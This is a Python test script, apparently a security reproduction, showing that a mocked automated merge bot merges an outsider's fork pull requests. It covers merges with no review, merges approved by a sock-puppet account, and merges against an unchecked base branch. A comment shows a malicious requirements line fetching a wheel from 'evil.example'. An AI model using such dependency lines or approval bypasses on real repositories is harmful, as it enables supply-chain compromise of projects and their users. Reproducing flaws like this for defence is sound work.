"""R1: an outsider's fork PR is observed, judged and merged.
(a) dependency-only fork PR, no human at all -> autonomous merge;
(b) code-changing fork PR + approval from a sock-puppet account with no write access -> 'reviewed' merge;
(c) base branch is never checked (here: the PR targets the standard-journal branch)."""
from harness import World

SHA_A, SHA_B, SHA_C = "a" * 40, "b" * 40, "c" * 40


class ForkGH:
    repo = "o/demo"

    def can_write(self, login):
        return False                                  # eve is a sock puppet

    def __init__(self):
        self.merged = set()
        self.prs = {
            "41": dict(number=41, user={"login": "mallory"}, base={"ref": "main"},
                       head={"ref": "standard/deps/vulns/deadbeef", "sha": SHA_A, "repo": {"full_name": "mallory/demo"}}),
            "42": dict(number=42, user={"login": "mallory"}, base={"ref": "main"},
                       head={"ref": "standard/code/sast/deadbeef", "sha": SHA_B, "repo": {"full_name": "mallory/demo"}}),
            "43": dict(number=43, user={"login": "mallory"}, base={"ref": "standard-journal"},
                       head={"ref": "standard/supply/sbom/deadbeef", "sha": SHA_C, "repo": {"full_name": "mallory/demo"}}),
        }

    def pulls(self):
        return [p for n, p in self.prs.items() if n not in self.merged]

    def pull(self, n):
        p = self.prs[str(n)]
        return {"merged": str(n) in self.merged, "head": {"sha": p["head"]["sha"]}, "changed_files": 1}

    def merge(self, n):
        self.merged.add(str(n))

    def files(self, n):
        return {"41": ["requirements.txt"],                       # e.g. "invoicelib @ https://evil.example/x.whl"
                "42": ["app/service.py"], "43": ["sbom.json"]}[str(n)]

    def reviews(self, n):
        # sock puppet 'eve' (author_association NONE, no write permission) approves the fork's code PR
        return [{"state": "APPROVED", "commit_id": SHA_B, "user": {"login": "eve"}, "author_association": "NONE"}] if str(n) == "42" else []

    def check_runs(self, sha):
        return [{"name": "test", "conclusion": "success"}]


gh = ForkGH()
w = World(gh)
with w.env():
    w.boot()
    w.clock.t += 60
    w.step("scan")
    s = w.step("ask")
    print("intents:", sorted((i["args"]["pr"], i["args"]["area"], i["args"]["item"]) for i in s["intents"].values()))
    s = w.step("guard")
    print("executed:", list(s["executed"].values()))
    print("PUT merges sent:", [(c[1].split("/pulls/")[1], c[2]["sha"][:6]) for c in w.calls if c[0] == "PUT"])
    print("merged on fake GitHub:", sorted(gh.merged))
